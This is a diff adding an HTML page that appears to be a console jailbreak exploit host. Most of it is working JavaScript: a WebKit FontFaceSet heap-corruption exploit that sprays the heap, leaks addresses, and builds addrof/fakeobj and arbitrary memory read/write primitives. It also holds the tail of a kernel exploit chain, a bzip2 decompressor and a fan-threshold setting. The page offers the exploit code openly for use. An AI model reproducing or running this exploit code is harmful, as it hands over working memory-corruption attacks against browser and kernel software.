+            sessionStorage.Exploit="yes";
+            setTimeout(load_pocj, 50);
+        }
+        else
+        {
+            alert("failed to trigger exploit kernel heap might be corrupted, try again or reboot the console");
+            p.write8(0, 0);
+        }
+ };
+ 
+ function kernelX() {
+  extra_gadgets();
+  kchain_setup();
+  object_setup();
+  trigger_spray();
+ }
+ 
+ kernelX();
+}
+
+function poc() {
+ var PAGE_SIZE = 16384;
+ var SIZEOF_CSS_FONT_FACE = 0xb8;
+ var HASHMAP_BUCKET = 208;
+ var STRING_OFFSET = 20;
+ var SPRAY_FONTS = 0x100a;
+ var GUESS_FONT = 0x200430000;
+ var NPAGES = 20;
+ var INVALID_POINTER = 0;
+ var HAMMER_FONT_NAME = "font8";
+ var HAMMER_NSTRINGS = 700;
+ var union = new ArrayBuffer(8);
+ var union_b = new Uint8Array(union);
+ var union_i = new Uint32Array(union);
+ var union_f = new Float64Array(union);
+ var bad_fonts = [];
+ for (var i = 0; i < SPRAY_FONTS; i++)
+  bad_fonts.push(new FontFace("font1", "", {}));
+ var good_font = new FontFace("font2", "url(data:text/html,)", {});
+ bad_fonts.push(good_font);
+ var arrays = [];
+ for (var i = 0; i < 512; i++)
+  arrays.push(new Array(31));
+ arrays[256][0] = 1.5;
+ arrays[257][0] = {};
+ arrays[258][0] = 1.5;
+ var jsvalue = {
+  a: arrays[256],
+  b: new Uint32Array(1),
+  c: true
+ };
+ var string_atomifier = {};
+ var string_id = 10000000;
+ function ptrToString(p) {
+  var s = '';
+  for (var i = 0; i < 8; i++) {
+   s += String.fromCharCode(p % 256);
+   p = (p - p % 256) / 256;
+  }
+  return s;
+ }
+ function stringToPtr(p, o) {
+  if (o === undefined)
+   o = 0;
+  var ans = 0;
+  for (var i = 7; i >= 0; i--)
+   ans = 256 * ans + p.charCodeAt(o + i);
+  return ans;
+ }
+ var strings = [];
+ function mkString(l, head) {
+  var s = head + '\u0000'.repeat(l - STRING_OFFSET - 8 - head.length) + (string_id++);
+  string_atomifier[s] = 1;
+  strings.push(s);
+  return s;
+ }
+ var guf = GUESS_FONT;
+ var ite = true;
+ var matches = 0;
+ var round = 0;
+ window.ffses = {};
+ do {
+  var p_s = ptrToString(NPAGES + 2);
+  for (var i = 0; i < NPAGES; i++)
+   p_s += ptrToString(guf + i * PAGE_SIZE);
+  p_s += ptrToString(INVALID_POINTER);
+  for (var i = 0; i < 256; i++)
+   mkString(HASHMAP_BUCKET, p_s);
+  var ffs = ffses["search_" + (++round)] = new FontFaceSet(bad_fonts);
+  var badstr1 = mkString(HASHMAP_BUCKET, p_s);
+  var guessed_font = null;
+  var guessed_addr = null;
+  for (var i = 0; i < SPRAY_FONTS; i++) {
+   bad_fonts[i].family = "search" + round;
+   if (badstr1.substr(0, p_s.length) != p_s) {
+    guessed_font = i;
+    var p_s1 = badstr1.substr(0, p_s.length);
+    for (var i = 1; i <= NPAGES; i++) {
+     if (p_s1.substr(i * 8, 8) != p_s.substr(i * 8, 8)) {
+      guessed_addr = stringToPtr(p_s.substr(i * 8, 8));
+      break;
+     }
+    }
+    if (matches++ == 0) {
+     guf = guessed_addr + 2 * PAGE_SIZE;
+     guessed_addr = null;
+    }
+    break;
+   }
+  }
+  if ((ite = !ite))
+   guf += NPAGES * PAGE_SIZE;
+ } while (guessed_addr === null);
+ var p_s = '';
+ p_s += ptrToString(26);
+ p_s += ptrToString(guessed_addr);
+ p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
+ for (var i = 0; i < 19; i++)
+  p_s += ptrToString(INVALID_POINTER);
+ for (var i = 0; i < 256; i++)
+  mkString(HASHMAP_BUCKET, p_s);
+ var needfix = [];
+ for (var i = 0; ; i++) {
+  ffses["ffs_leak_" + i] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], good_font]);
+  var badstr2 = mkString(HASHMAP_BUCKET, p_s);
+  needfix.push(mkString(HASHMAP_BUCKET, p_s));
+  bad_fonts[guessed_font].family = "evil2";
+  bad_fonts[guessed_font + 1].family = "evil3";
+  var leak = stringToPtr(badstr2.substr(badstr2.length - 8));
+  if (leak < 0x1000000000000)
+   break;
+ }
+ function makeReader(read_addr, ffs_name) {
+  var fake_s = '';
+  fake_s += '0000';
+  fake_s += '\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff';
+  fake_s += ptrToString(read_addr);
+  fake_s += ptrToString(0x80000014);
+  p_s = '';
+  p_s += ptrToString(29);
+  p_s += ptrToString(guessed_addr);
+  p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
+  p_s += ptrToString(guessed_addr + 2 * SIZEOF_CSS_FONT_FACE);
+  for (var i = 0; i < 18; i++)
+   p_s += ptrToString(INVALID_POINTER);
+  for (var i = 0; i < 256; i++)
+   mkString(HASHMAP_BUCKET, p_s);
+  var the_ffs = ffses[ffs_name] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], bad_fonts[guessed_font + 2], good_font]);
+  mkString(HASHMAP_BUCKET, p_s);
+  var relative_read = mkString(HASHMAP_BUCKET, fake_s);
+  bad_fonts[guessed_font].family = ffs_name + "_evil1";
+  bad_fonts[guessed_font + 1].family = ffs_name + "_evil2";
+  bad_fonts[guessed_font + 2].family = ffs_name + "_evil3";
+  needfix.push(relative_read);
+  if (relative_read.length < 1000)
+   return makeReader(read_addr, ffs_name + '_');
+  return relative_read;
+ }
+ var fastmalloc = makeReader(leak, 'ffs3');
+ for (var i = 0; i < 100000; i++)
+  mkString(128, '');
+ var props = [];
+ for (var i = 0; i < 0x10000; i++) {
+  props.push({
+   value: 0x41434442
+  });
+  props.push({
+   value: jsvalue
+  });
+ }
+ var jsvalue_leak = null;
+ while (jsvalue_leak === null) {
+  Object.defineProperties({}, props);
+  for (var i = 0; ; i++) {
+   if (fastmalloc.charCodeAt(i) == 0x42 && fastmalloc.charCodeAt(i + 1) == 0x44 && fastmalloc.charCodeAt(i + 2) == 0x43 && fastmalloc.charCodeAt(i + 3) == 0x41 && fastmalloc.charCodeAt(i + 4) == 0 && fastmalloc.charCodeAt(i + 5) == 0 && fastmalloc.charCodeAt(i + 6) == 254 && fastmalloc.charCodeAt(i + 7) == 255 && fastmalloc.charCodeAt(i + 24) == 14) {
+    jsvalue_leak = stringToPtr(fastmalloc, i + 32);
+    break;
+   }
+  }
+ }
+ var rd_leak = makeReader(jsvalue_leak, 'ffs4');
+ var array256 = stringToPtr(rd_leak, 16);
+ var ui32a = stringToPtr(rd_leak, 24);
+ var rd_arr = makeReader(array256, 'ffs5');
+ var butterfly = stringToPtr(rd_arr, 8);
+ var rd_ui32 = makeReader(ui32a, 'ffs6');
+ for (var i = 0; i < 8; i++)
+  union_b[i] = rd_ui32.charCodeAt(i);
+ var structureid_low = union_i[0];
+ var structureid_high = union_i[1];
+ union_i[0] = 0x10000;
+ union_i[1] = 0;
+ arrays[257][1] = {};
+ arrays[257][0] = union_f[0];
+ union_i[0] = (guessed_addr + 12 * SIZEOF_CSS_FONT_FACE) | 0;
+ union_i[1] = (guessed_addr - guessed_addr % 0x100000000) / 0x100000000;
+ arrays[256][i] = union_f[0];
+ pp_s = '';
+ pp_s += ptrToString(56);
+ for (var i = 0; i < 12; i++)
+  pp_s += ptrToString(guessed_addr + i * SIZEOF_CSS_FONT_FACE);
+ var fake_s = '';
+ fake_s += '0000';
+ fake_s += ptrToString(INVALID_POINTER);
+ fake_s += ptrToString(butterfly);
+ fake_s += '\u0000\u0000\u0000\u0000\u0022\u0000\u0000\u0000';
+ var ffs7_args = [];
+ for (var i = 0; i < 12; i++)
+  ffs7_args.push(bad_fonts[guessed_font + i]);
+ ffs7_args.push(good_font);
+ var ffs8_args = [bad_fonts[guessed_font + 12]];
+ for (var i = 0; i < 5; i++)
+  ffs8_args.push(new FontFace(HAMMER_FONT_NAME, "url(data:text/html,)", {}));
+ for (var i = 0; i < HAMMER_NSTRINGS; i++)
+  mkString(HASHMAP_BUCKET, pp_s);
+ ffses.ffs7 = new FontFaceSet(ffs7_args);
+ mkString(HASHMAP_BUCKET, pp_s);
+ ffses.ffs8 = new FontFaceSet(ffs8_args);
+ var post_ffs = mkString(HASHMAP_BUCKET, fake_s);
+ needfix.push(post_ffs);
+ for (var i = 0; i < 13; i++)
+  bad_fonts[guessed_font + i].family = "hammer" + i;
+ function boot_addrof(obj) {
+  arrays[257][32] = obj;
+  union_f[0] = arrays[258][0];
+  return union_i[1] * 0x100000000 + union_i[0];
+ }
+ function boot_fakeobj(addr) {
+  union_i[0] = addr;
+  union_i[1] = (addr - addr % 0x100000000) / 0x100000000;
+  arrays[258][0] = union_f[0];
+  return arrays[257][32];
+ }
+ var arw_master = new Uint32Array(8);
+ var arw_slave = new Uint8Array(1);
+ var obj_master = new Uint32Array(8);
+ var obj_slave = {
+  obj: null
+ };
+ var addrof_slave = boot_addrof(arw_slave);
+ var addrof_obj_slave = boot_addrof(obj_slave);
+ union_i[0] = structureid_low;
+ union_i[1] = structureid_high;
+ union_b[6] = 7;
+ var obj = {
+  jscell: union_f[0],
+  butterfly: true,
+  buffer: arw_master,
+  size: 0x5678
+ };
+ function i48_put(x, a) {
+  a[4] = x | 0;
+  a[5] = (x / 4294967296) | 0;
+ }
+ function i48_get(a) {
+  return a[4] + a[5] * 4294967296;
+ }
+ window.addrof = function (x) {
+  obj_slave.obj = x;
+  return i48_get(obj_master);
+ };
+ window.fakeobj = function (x) {
+  i48_put(x, obj_master);
+  return obj_slave.obj;
+ };
+ function read_mem_setup(p, sz) {
+  i48_put(p, arw_master);
+  arw_master[6] = sz;
+ }
+ window.read_mem = function (p, sz) {
+  read_mem_setup(p, sz);
+  var arr = [];
+  for (var i = 0; i < sz; i++)
+   arr.push(arw_slave[i]);
+  return arr;
+ };
+ window.write_mem = function (p, data) {
+  read_mem_setup(p, data.length);
+  for (var i = 0; i < data.length; i++)
+   arw_slave[i] = data[i];
+ };
+ window.read_ptr_at = function (p) {
+  var ans = 0;
+  var d = read_mem(p, 8);
+  for (var i = 7; i >= 0; i--)
+   ans = 256 * ans + d[i];
+  return ans;
+ };
+ window.write_ptr_at = function (p, d) {
+  var arr = [];
+  for (var i = 0; i < 8; i++) {
+   arr.push(d & 0xff);
+   d /= 256;
+  }
+  write_mem(p, arr);
+ };
+ (function () {
+  var magic = boot_fakeobj(boot_addrof(obj) + 16);
+  magic[4] = addrof_slave;
+  magic[5] = (addrof_slave - addrof_slave % 0x100000000) / 0x100000000;
+  obj.buffer = obj_master;
+  magic[4] = addrof_obj_slave;
+  magic[5] = (addrof_obj_slave - addrof_obj_slave % 0x100000000) / 0x100000000;
+  magic = null;
+ })();
+ (function () {
+  var ffs_addr = read_ptr_at(addrof(post_ffs) + 8) - 208;
+  write_mem(ffs_addr, read_mem(ffs_addr - 96, 208));
+  for (var i = 0; i < needfix.length; i++) {
+   var addr = read_ptr_at(addrof(needfix[i]) + 8);
+   write_ptr_at(addr, (HASHMAP_BUCKET - 20) * 0x100000000 + 1);
+   write_ptr_at(addr + 8, addr + 20);
+   write_ptr_at(addr + 16, 0x80000014);
+  }
+  write_ptr_at(butterfly + 248, 0x1f0000001f);
+ })();
+ var expl_master = new Uint32Array(8);
+ var expl_slave = new Uint32Array(2);
+ var addrof_expl_slave = addrof(expl_slave);
+ var m = fakeobj(addrof(obj) + 16);
+ obj.buffer = expl_slave;
+ m[7] = 1;
+ obj.buffer = expl_master;
+ m[4] = addrof_expl_slave;
+ m[5] = (addrof_expl_slave - addrof_expl_slave % 0x100000000) / 0x100000000;
+ m[7] = 1;
+ var prim = {
+  write8: function (addr, value) {
+   expl_master[4] = addr.low;
+   expl_master[5] = addr.hi;
+   if (value instanceof int64) {
+    expl_slave[0] = value.low;
+    expl_slave[1] = value.hi;
+   } else {
+    expl_slave[0] = value;
+    expl_slave[1] = 0;
+   }
+  },
+  write4: function (addr, value) {
+   expl_master[4] = addr.low;
+   expl_master[5] = addr.hi;
+   if (value instanceof int64) {
+    expl_slave[0] = value.low;
+   } else {
+    expl_slave[0] = value;
+   }
+  },
+  write2: function (addr, value) {
+   expl_master[4] = addr.low;
+   expl_master[5] = addr.hi;
+   var tmp = expl_slave[0] & 0xFFFF0000;
+   if (value instanceof int64) {
+    expl_slave[0] = ((value.low & 0xFFFF) | tmp);
+   } else {
+    expl_slave[0] = ((value & 0xFFFF) | tmp);
+   }
+  },
+  write1: function (addr, value) {
+   expl_master[4] = addr.low;
+   expl_master[5] = addr.hi;
+   var tmp = expl_slave[0] & 0xFFFFFF00;
+   if (value instanceof int64) {
+    expl_slave[0] = ((value.low & 0xFF) | tmp);
+   } else {
+    expl_slave[0] = ((value & 0xFF) | tmp);
+   }
+  },
+  read8: function (addr) {
+   expl_master[4] = addr.low;
+   expl_master[5] = addr.hi;
+   return new int64(expl_slave[0], expl_slave[1]);
+  },
+  read4: function (addr) {
+   expl_master[4] = addr.low;
+   expl_master[5] = addr.hi;
+   return expl_slave[0];
+  },
+  read2: function (addr) {
+   expl_master[4] = addr.low;
+   expl_master[5] = addr.hi;
+   return expl_slave[0] & 0xFFFF;
+  },
+  read1: function (addr) {
+   expl_master[4] = addr.low;
+   expl_master[5] = addr.hi;
+   return expl_slave[0] & 0xFF;
+  },
+  leakval: function (obj) {
+   obj_slave.obj = obj;
+   return new int64(obj_master[4], obj_master[5]);
+  }
+ };
+ window.p = prim;
+ run_hax();
+}
+
+</script>
+<script>
+var bzip2 = {};
+
+bzip2.array = function(bytes) {
+  var bit = 0, byte = 0;
+  var BITMASK = [0, 0x01, 0x03, 0x07, 0x0F, 0x1F, 0x3F, 0x7F, 0xFF];
+  return function(n) {
+    var result = 0;
+    while (n > 0) {
+      var left = 8 - bit;
+      if (n >= left) {
+        result <<= left;
+        result |= (BITMASK[left] & bytes[byte++]);
+        bit = 0;
+        n -= left;
+      } else {
+        result <<= n;
+        result |= ((bytes[byte] & (BITMASK[n] << (8 - n - bit))) >> (8 - n - bit));
+        bit += n;
+        n = 0;
+      }
+    }
+    return result;
+  }
+};
+
+bzip2.simple = function(bits) {
+  var size = bzip2.header(bits);
+  var all = [], chunk = [];
+  do {
+    all = all.concat(chunk);
+    chunk = bzip2.decompress(bits, size);
+  } while (chunk != -1);
+  return Uint8Array.from(all);
+};
+
+bzip2.header = function(bits) {
+  if (bits(8 * 3) != 4348520) throw "No magic number found.";
+  var i = bits(8) - 48;
+  if (i < 1 || i > 9) throw "Not a bzip2 archive.";
+  return i;
+};
+
+// Param1: a function for reading the block data (starting with 0x314159265359)
+// Param2: block size (0-9) (optional, defaults to 9)
+// Param3: length at which to stop decompressing and return the output
+bzip2.decompress = function(bits, size, len) {
+  var MAX_HUFCODE_BITS = 20;
+  var MAX_SYMBOLS = 258;
+  var SYMBOL_RUNA = 0;
+  var SYMBOL_RUNB = 1;
+  var GROUP_SIZE = 50;
+
+  var bufsize = 100000 * size;
+  for (var h = "", i = 0; i < 6; i++) h += bits(8).toString(16);
+  if (h == "177245385090") return -1; // Last block
+  if (h != "314159265359") throw "Not valid bzip2 data.";
+  bits(32); // Ignore CRC codes
+  if (bits(1)) throw "Unsupported obsolete version.";
+  var origPtr = bits(24);
+  if(origPtr > bufsize) throw "Initial position larger than buffer size.";
+  var t = bits(16);
+  var symToByte = new Uint8Array(256),
+      symTotal = 0;
+  for (i = 0; i < 16; i++) {
+    if (t & (1 << (15 - i))) {
+      var k = bits(16);
+      for (j = 0; j < 16; j++) {
+        if (k & (1 << (15 - j))) {
+          symToByte[symTotal++] = (16 * i) + j;
+        }
+      }
+    }
+  }
+
+  var groupCount = bits(3);
+  if (groupCount < 2 || groupCount > 6) throw "Error 1 while decompressing.";
+  var nSelectors = bits(15);
+  if (nSelectors == 0) throw "Error 2 while decompressing.";
+  var mtfSymbol = []; // TODO: possibly replace JS array with typed arrays
+  for (var i = 0; i < groupCount; i++) mtfSymbol[i] = i;
+  var selectors = new Uint8Array(32768);
+
+  for (var i = 0; i < nSelectors; i++) {
+    for (var j = 0; bits(1); j++) if (j >= groupCount) throw "Error 3 while decompressing.";
+    var uc = mtfSymbol[j];
+    mtfSymbol.splice(j, 1); // This is a probably inefficient MTF transform
+    mtfSymbol.splice(0, 0, uc);
+    selectors[i] = uc;
+  }
+
+  var symCount = symTotal + 2;
+  var groups = [];
+  for (var j = 0; j < groupCount; j++) {
+    var length = new Uint8Array(MAX_SYMBOLS),
+        temp = new Uint8Array(MAX_HUFCODE_BITS + 1);
+    t = bits(5); // Lengths
+    for (var i = 0; i < symCount; i++) {
+      while (true) {
+        if (t < 1 || t > MAX_HUFCODE_BITS) throw "Error 4 while decompressing.";
+        if (!bits(1)) break;
+        if (!bits(1)) t++;
+        else t--;
+      }
+      length[i] = t;
+    }
+    var  minLen,  maxLen;
+    minLen = maxLen = length[0];
+    for (var i = 1; i < symCount; i++) {
+      if (length[i] > maxLen) maxLen = length[i];
+      else if (length[i] < minLen) minLen = length[i];
+    }
+    var hufGroup;
+    hufGroup = groups[j] = {};
+    hufGroup.permute = new Uint32Array(MAX_SYMBOLS);
+    hufGroup.limit = new Uint32Array(MAX_HUFCODE_BITS + 1);
+    hufGroup.base = new Uint32Array(MAX_HUFCODE_BITS + 1);
+    hufGroup.minLen = minLen;
+    hufGroup.maxLen = maxLen;
+    var base = hufGroup.base.subarray(1);
+    var limit = hufGroup.limit.subarray(1);
+    var pp = 0;
+    for (var i = minLen; i <= maxLen; i++)
+      for (var t = 0; t < symCount; t++)
+      if (length[t] == i) hufGroup.permute[pp++] = t;
+      for (i = minLen; i <= maxLen; i++) temp[i] = limit[i] = 0;
+      for (i = 0; i < symCount; i++) temp[length[i]]++;
+      pp = t = 0;
+      for (i = minLen; i < maxLen; i++) {
+        pp += temp[i];
+        limit[i] = pp - 1;
+        pp <<= 1;
+        base[i + 1] = pp - (t += temp[i]);
+      }
+      limit[maxLen] = pp + temp[maxLen] - 1;
+      base[minLen] = 0;
+  }
+  var byteCount = new Uint32Array(256);
+  for (var i = 0; i < 256; i++) mtfSymbol[i] = i;
+  var runPos, count, symCount, selector;
+  runPos = count = symCount = selector = 0;
+  var buf = new Uint32Array(bufsize);
+  while (true) {
+    if (!(symCount--)) {
+      symCount = GROUP_SIZE - 1;
+      if (selector >= nSelectors) throw "Error 5 while decompressing.";
+      hufGroup = groups[selectors[selector++]];
+      base = hufGroup.base.subarray(1);
+      limit = hufGroup.limit.subarray(1);
+    }
+    i = hufGroup.minLen;
+    j = bits(i);
+    while (true) {
+      if (i > hufGroup.maxLen) throw "Error 6 while decompressing.";
+      if (j <= limit[i]) break;
+      i++;
+      j = (j << 1) | bits(1);
+    }
+    j -= base[i];
+    if (j < 0 || j >= MAX_SYMBOLS) throw "Error 7 while decompressing.";
+    var nextSym = hufGroup.permute[j];
+    if (nextSym == SYMBOL_RUNA || nextSym == SYMBOL_RUNB) {
+      if (!runPos) {
+        runPos = 1;
+        t = 0;
+      }
+      if (nextSym == SYMBOL_RUNA) t += runPos;
+      else t += 2 * runPos;
+      runPos <<= 1;
+      continue;
+    }
+    if (runPos) {
+      runPos = 0;
+      if (count + t >= bufsize) throw "Error 8 while decompressing.";
+      uc = symToByte[mtfSymbol[0]];
+      byteCount[uc] += t;
+      while (t--) buf[count++] = uc;
+    }
+    if (nextSym > symTotal) break;
+    if (count >= bufsize) throw "Error 9 while decompressing.";
+    i = nextSym -1;
+    uc = mtfSymbol[i];
+    mtfSymbol.splice(i, 1);
+    mtfSymbol.splice(0, 0, uc);
+    uc = symToByte[uc];
+    byteCount[uc]++;
+    buf[count++] = uc;
+  }
+  if (origPtr < 0 || origPtr >= count) throw "Error 10 while decompressing.";
+  var j = 0;
+  for (var i = 0; i < 256; i++) {
+    k = j + byteCount[i];
+    byteCount[i] = j;
+    j = k;
+  }
+  for (var i = 0; i < count; i++) {
+    uc = buf[i] & 0xff;
+    buf[byteCount[uc]] |= (i << 8);
+    byteCount[uc]++;
+  }
+  var pos = 0, current = 0, run = 0;
+  if (count) {
+    pos = buf[origPtr];
+    current = (pos & 0xff);
+    pos >>= 8;
+    run = -1;
+  }
+  count = count;
+  var output = [];
+  var copies, previous, outbyte;
+  if (!len) len = Infinity;
+  while (count) {
+    count--;
+    previous = current;
+    pos = buf[pos];
+    current = pos & 0xff;
+    pos >>= 8;
+    if (run++ == 3) {
+      copies = current;
+      outbyte = previous;
+      current = -1;
+    } else {
+      copies = 1;
+      outbyte = current;
+    }
+    while (copies--) {
+      output.push(outbyte);
+      if (!--len) return output;
+    }
+    if (current != previous) run = 0;
+  }
+  return output;
+};
+</script>
+<script>
+localStorage.setItem('fanthreshold', tempC.value);
+for(var i=50; i<=80; i=i+5){
+    var select = document.getElementById("tempC");
+    var option = document.createElement("OPTION");
+	select.options.add(option);
+	option.text = i;
+	option.value = i;
+}
+tempC.value=60;
+</script>
+</body>
+
+</html>
